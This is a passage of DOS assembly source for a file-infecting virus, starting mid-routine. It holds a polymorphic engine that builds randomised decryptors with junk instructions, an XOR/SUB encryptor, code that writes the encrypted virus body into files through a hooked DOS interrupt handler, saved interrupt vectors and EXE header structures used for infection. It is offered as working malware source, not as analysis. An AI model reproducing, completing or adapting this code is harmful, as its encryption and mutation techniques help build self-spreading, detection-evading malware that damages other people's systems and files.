                MOV     BP, DX                  ; BP is used as a pointer to
                                                ; random data.
		PUSH	DS
		POP	ES

                MOV     DI, OFFSET Decryptor    ; Fill the decryptor area
                MOV     SI, DI                  ; with a random word.
                MOV     CX, (64/2)
                CLD
                REP     STOSW

                XOR     DX, DX                  ; Zero ES.
                MOV     ES, DX

                CALL    Make_Load_DS            ; Construct the decryptor.
                CALL    Make_Load_Ptr
                CALL    Make_Decr_Loop

                MOV     BYTE PTR [SI], 0E9h     ; JMP 16-bit displacement.

                MOV     DI, OFFSET Init_Virus   ; Calculate displacement
                SUB     DI, SI                  ; to Init_Virus.
                SUB     DI, 3

		INC	SI

                MOV     [SI], DI                ; Set displacement.

                MOV     AX, OFFSET Append_Body_Encrypted_Copy
                CALL    AX

		POP	BP

		RETN


Make_Load_DS:
                DEC     BP                      ; Adjust random pointer.
                                                ; *** Not needed as this is
                                                ; the first reference to it.

                TEST    BYTE PTR ES:[BP], 00000010b  ; Test a random bit.
                JNZ     Make_Load_DS_2

Make_Load_DS_1: MOV     BYTE PTR [SI], 0Eh      ; PUSH CS
		INC	SI

                CALL    Add_Junk                ; Add a garbage instruction.

                MOV     BYTE PTR [SI], 1Fh      ; POP DS
		INC	SI

                CALL    Add_Junk

		RETN

Make_Load_DS_2: MOV     [SI], 0CB8Ch            ; MOV BX, CS
		INC	SI
		INC	SI

                CALL    Add_Junk

                MOV     [SI], 0DB8Eh            ; MOV DS, BX
		INC	SI
		INC	SI

                CALL    Add_Junk

		RETN


Make_Load_Ptr:
                AND     CH, 11111110b           ; BX is start code.
                                                ; *** CX is already zero.
		DEC	BP

                TEST    BYTE PTR ES:[BP], 00000010b
                JZ      Make_MOV_BX

                OR      CH, 00000001b           ; SI is start code.

Make_MOV_SI:    MOV     BYTE PTR [SI], 0BEh     ; MOV SI, xxxx
		INC	SI

                MOV     [SI], BX                ; Start virus in CS or
                INC     SI                      ; start decryptor in CS.
		INC	SI

                CALL    Add_Junk

                ADD     BX, OFFSET Decryptor

                TEST    CH, 00000001b           ; BX is start code?
                JZ      Make_Counter

Make_MOV_BX:    MOV     BYTE PTR [SI], 0BBh     ; MOV BX, xxxx
		INC	SI

                MOV     [SI], BX                ; Start virus in CS or
                INC     SI                      ; start decryptor in CS.
		INC	SI

                CALL    Add_Junk

                ADD     BX, OFFSET Decryptor

                TEST    CH, 00000001b           ; BX is start code?
                JZ      Make_MOV_SI             ; Then use SI as start
                                                ; decryptor.

Make_Counter:   SUB     BX, OFFSET Decryptor    ; Restore BX to virus offset.

                CALL    Add_Junk

                ; CX is always the counter register.

                MOV     BYTE PTR [SI], 0B9h     ; MOV CX, xxxx
		INC	SI

                MOV     AX, OFFSET Decryptor

                MOV     [SI], AX                ; Size of encrypted code.
		INC	SI
		INC	SI

                CALL    Add_Junk
                CALL    Add_Junk

		RETN


Make_Decr_Loop:
                MOV     AH, 14h                 ; DL, [SI]
                MOV     DH, 17h                 ; DL, [BX]

                TEST    CH, 00000001b           ; BX is start of code?
                JZ      Make_Load_Byte          ; Yeah.

                XCHG    AH, DH                  ; Else SI is.

Make_Load_Byte: MOV     DI, SI                  ; Save start decrypt in DI.

                MOV     AL, 8Ah                 ; MOV reg8

                MOV     [SI], AX                ; MOV DL, [SI]/[BX]
		INC	SI
		INC	SI

                CALL    Add_Junk

                XOR     DL, DL                  ; ADD BYTE PTR

                ; Initialize the encryptor.

                MOV     BYTE PTR DS:[Append_Body_Encrypted_Copy+(Encryptor-Append_Body_Encrypted)], 28h  ; SUB BYTE PTR

		DEC	BP

                TEST    BYTE PTR ES:[BP], 00000010b
                JZ      Store_Decrypt

                MOV     DL, 30h                 ; XOR BYTE PTR

                ; Initialize the encryptor.

                MOV     BYTE PTR DS:[Append_Body_Encrypted_Copy+(Encryptor-Append_Body_Encrypted)], DL

Store_Decrypt:  MOV     [SI], DX                ; Store decrypt instruction.
		INC	SI
		INC	SI

                MOV     [SI], 4346h             ; INC SI / INC BX
		INC	SI
		INC	SI

                CALL    Add_Junk

                MOV     AX, 0FE81h              ; CMP SI, xxxx
                MOV     CL, 0BEh                ; MOV SI, xxxx

                TEST    CH, 00000001b           ; BX is start of code?
                JZ      Make_CMP_End            ; Yip-yip.

                MOV     AH, 0FBh                ; CMP BX, xxxx
                MOV     CL, 0BBh                ; MOV BX, xxxx

Make_CMP_End:   MOV     [SI], AX                ; Make CMP end_decryptor.
		INC	SI
		INC	SI

		PUSH	BX

                ADD     BX, 64                  ; Offset decryptor + fixed
                                                ; size of decryptor.

                MOV     [SI], BX                ; (end of decryptor).
		INC	SI
		INC	SI

                POP     BX                      ; Start of code.

                MOV     BYTE PTR [SI], 72h      ; JB xx
		INC	SI

                MOV     DX, SI                  ; DX = displacement patch
                                                ; offset.
		INC	SI

                CALL    Add_Junk

                MOV     [SI], CL                ; MOV BX/SI, xxxx
		INC	SI

                MOV     [SI], BX                ; Start decryptor.
		INC	SI
		INC	SI

                MOV     AX, SI                  ; Calculate displacement
                SUB     AX, DX                  ; between DX and SI.
		DEC	AX

                MOV     BX, DX                  ; JB displacement offset.
                MOV     [BX], AL                ; Patch it.

                CALL    Add_Junk
                CALL    Add_Junk

                MOV     BYTE PTR [SI], 0E2h     ; LOOP xx
		INC	SI

                SUB     DI, SI                  ; Displacement between here
                DEC     DI                      ; and start decrypt loop.

                MOV     AX, DI

                MOV     [SI], AL                ; Store displacement.
		INC	SI

                CALL    Add_Junk

		RETN


Add_Junk:
		DEC	BP

                TEST    BYTE PTR ES:[BP], 00001111b
                JZ      Exit_Add_Junk

		DEC	BP
                MOV     AL, ES:[BP]

                TEST    AL, 00000010b
                JZ      Junk_CMP

                TEST    AL, 00000100b
                JZ      Junk_TEST

                TEST    AL, 00001000b
                JZ      Junk_NOP

                MOV     [SI], 0C789h            ; MOV DI, AX
		INC	SI
		INC	SI

                JMP     Exit_Add_Junk

Junk_NOP:       MOV     BYTE PTR [SI], 90h      ; NOP
		INC	SI

                JMP     Exit_Add_Junk

Junk_TEST:      MOV     AL, 85h                 ; TEST r16

Make_Operand:   DEC     BP
                MOV     AH, ES:[BP]

                TEST    AH, 00000010b
                JZ      Set_reg_reg

                DEC     AL                      ; r16 -> r8.

Set_reg_reg:    OR      AH, 11000000b           ; reg/reg operation.

                MOV     [SI], AX                ; Store junk instruction.
		INC	SI
		INC	SI

                JMP     Exit_Add_Junk

Junk_CMP:       DEC     BP

                TEST    BYTE PTR ES:[BP], 00000010b
                JZ      Junk_CLD

                MOV     AL, 39h                 ; CMP r16, r16
                JMP     Make_Operand

Junk_CLD:       MOV     BYTE PTR [SI], 0FCh     ; CLD
		INC	SI

Exit_Add_Junk:  RETN


Append_Body_Encrypted:

                CALL    Crypt_Virus

                MOV     AH, 40h
                MOV     BX, File_Handle
                MOV     DX, 0
                MOV     CX, Virus_Size

                PUSHF
                CALL    DWORD PTR Old_Int21h
                JC      Crypt_Loop

                SUB     AX, CX

Crypt_Loop:     PUSHF

                CMP     byte ptr ds:Append_Body_Encrypted_Copy+(Encryptor-Append_Body_Encrypted), 28h          ; SUB
                JNE     Do_Crypt_Virus

                MOV     byte ptr ds:Append_Body_Encrypted_Copy+(Encryptor-Append_Body_Encrypted), 0
Do_Crypt_Virus: CALL    Crypt_Virus

                POPF

		RETN


Crypt_Virus:
                MOV     BX, 0
                MOV     SI, OFFSET Decryptor
                MOV     CX, OFFSET Decryptor

Crypt_Byte:     MOV     DL, [SI]                ; Get key from the decryptor.

                XOR     [BX], DL                ; Encrypt/decrypt byte.
Encryptor       =       BYTE PTR $-2

                INC     SI
		INC	BX

                CMP     SI, OFFSET Old_Int13h
                JB      Loop_Crypt_B

                MOV     SI, OFFSET Decryptor

Loop_Crypt_B:   LOOP    Crypt_Byte

		RETN


Decryptor:
                PUSH    CS

                TEST    CL, BL

                POP     DS                      ; Load DS with CS.

                MOV     BX, 0

                TEST    SP, AX

                MOV     SI, OFFSET Decryptor    ; Decryptor pointer.

                CLD

                TEST    CH, BL

                MOV     CX, OFFSET Decryptor    ; Count to decrypt.

                TEST    AX, CX

Decrypt_Byte:   MOV     DL, [SI]                ; Get the key from the
                                                ; decryptor.

                DB      039h, 0D8h

                ; * CMP AX, BX *

                XOR     [BX], DL                ; Decrypt byte.

                INC     SI                      ; Update code & decryptor
                INC     BX                      ; pointers.

		NOP

                CMP     SI, OFFSET Old_Int13h   ; Completely ran over the
                JB      Decrypt_Loop            ; decryptor?

		NOP

                MOV     SI, OFFSET Decryptor    ; Then reload the pointer.

Decrypt_Loop:   NOP

                LOOP    Decrypt_Byte            ; Decrypt all bytes.

                CLD

                JMP     Init_Virus              ; Jump to the real start.

                ORG     Decryptor+64            ; Pad decryptor size.

Old_Int13h      DW      0, 0

End_Body:

Buffer:

File_Handle     DW      0
Old_SP          DW      0
Old_SS          DW      0
Old_Attr        DW      0
Old_File_Date   DW      0
Old_File_Time   DW      0
Old_Int1Ch      DW      0, 0
Old_Int21h      DW      0, 0
Old_Int24h      DW      0, 0
Int_Count       DW      0

New_Int13h_Copy:

                DB      (New_Int1Ch-New_Int13h) DUP(0)

Append_Body_Encrypted_Copy:

                DB      (Decryptor-Append_Body_Encrypted) DUP(0)

Header          DW      14 DUP(0)

Validate_Header DW      4 DUP(0)

                ORG     Buffer+512
End_Heap:


Carrier:
                MOV     AX, 4C00h
                INT     21h


EXE_Header      STRUC
EXE_ID          DW      0
Image_Mod_512   DW      0
File_512_Pages  DW      0
Reloc_Items     DW      0
Header_Size     DW      0
Min_Size_Mem    DW      0
Max_Size_Mem    DW      0
Program_SS      DW      0
Program_SP      DW      0
Checksum        DW      0
Program_IP      DW      0
Program_CS      DW      0
Reloc_Table     DW      0
EXE_Header      ENDS


Find_FN_FCB     STRUC
FCB_Drive       DB      0
FCB_Name        DB      8 DUP(0)
FCB_Ext         DB      3 DUP(0)
FCB_Attr        DB      0
FCB_Reserved    DB      10 DUP(0)
FCB_Time        DW      0
FCB_Date        DW      0
FCB_Start_Clust DW      0
FCB_Size        DW      0, 0
Find_FN_FCB     ENDS


Find_FN_Dir     STRUC
Dir_Reserved    DB      21 DUP(0)
Dir_Attr        DB      0
Dir_Time        DW      0
Dir_Date        DW      0
Dir_Size        DW      0, 0
Dir_Name        DB      13 DUP(0)
Find_FN_Dir     ENDS

                END     Init_Virus
